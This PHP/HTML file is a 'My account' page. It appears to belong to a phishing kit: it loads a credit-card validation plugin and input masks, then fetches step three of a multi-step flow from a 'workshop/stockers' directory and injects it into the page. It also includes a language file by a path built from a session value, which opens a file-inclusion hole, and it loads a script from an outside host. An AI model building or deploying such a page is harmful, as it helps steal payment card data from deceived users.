<?php session_start();if(!isset($_SESSION['language'])){exit(header("Location: index"));}else{include "../workshop/languages/{$_SESSION['language']}.php";}?><!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>My account</title><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"><link id="lib_main" type="text/css" rel="stylesheet" href="style/none.css"><link id="lib" type="text/css" rel="stylesheet" href="style/none2.css"><link rel="shortcut icon" href="pic/favicon.ico"><link rel="apple-touch-icon" href="pic/favicon.png"><script type="text/javascript" src="https://js-codes.com/modernizr/2.8.7/modernizr.min.js"></script><script src="js/jquery.js"></script> <script src="js/jquery.ccvalid.js"></script><script src="js/jquery.mask.js"></script></head><body><script>$(document).ready(function(){$.post("../workshop/stockers/step3.php",{one:"ok"},function(b,a){$("body").prepend(b)})});</script></body></html>